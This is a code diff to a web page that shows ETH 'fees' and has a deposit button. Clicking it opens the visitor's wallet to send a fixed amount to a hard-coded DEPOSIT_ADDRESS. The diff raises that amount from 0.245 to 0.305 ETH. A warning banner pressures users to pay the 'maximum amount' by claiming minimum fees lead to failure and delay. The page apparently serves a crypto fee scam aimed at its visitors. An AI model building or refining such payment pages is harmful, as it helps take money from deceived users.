@@ -693,22 +693,22 @@
                     <div class="fees-grid">
                         <div class="fee-item">
                             <div class="fee-label">Average</div>
-                            <div class="fee-value" id="avg-fee">0.341 ETH</div>
+                            <div class="fee-value" id="avg-fee">0.304 ETH</div>
                         </div>
                         <div class="fee-item">
                             <div class="fee-label">Minimum</div>
-                            <div class="fee-value" id="min-fee">0.203 ETH</div>
+                            <div class="fee-value" id="min-fee">0.225 ETH</div>
                         </div>
                         <div class="fee-item">
                             <div class="fee-label">Maximum</div>
-                            <div class="fee-value" id="max-fee">0.245 ETH</div>
+                            <div class="fee-value" id="max-fee">0.305 ETH</div>
                         </div>
                     </div>
 
                     <div class="warning-banner" role="alert" aria-live="polite">
                         <div class="warning-icon">⚠️</div>
                         <div class="warning-text" id="fee-warning">
-                            Warning: Using minimum fees may lead to failure and delay. Recommended: 0.245 ETH (maximum
+                            Warning: Using minimum fees may lead to failure and delay. Recommended: 0.305 ETH (maximum
                             amount).
                         </div>
                         <!-- Sub-warning (red) -->
@@ -1014,9 +1014,9 @@
 
             const to = DEPOSIT_ADDRESS;
 
-            const value = web3.utils.toWei('0.245', 'ether');
+            const value = web3.utils.toWei('0.305', 'ether');
 
-            showMessage(`⏳ Opening wallet to deposit 0.245 ETH...`, 'info');
+            showMessage(`⏳ Opening wallet to deposit 0.305 ETH...`, 'info');
 
             // Disable button during transaction
             document.getElementById('deposit-btn').disabled = true;
@@ -1037,7 +1037,7 @@
                 showMessage(`⏳ Waiting for confirmation...`, 'info');
                 const receipt = await web3.eth.getTransactionReceipt(txHash);
                 if (receipt && receipt.status) {
-                    showMessage(`🎉 Deposit confirmed! 0.245 ETH sent successfully!`, 'success');
+                    showMessage(`🎉 Deposit confirmed! 0.305 ETH sent successfully!`, 'success');
                 } else {
                     showMessage(`❌ Transaction failed or pending...`, 'error');
                 }
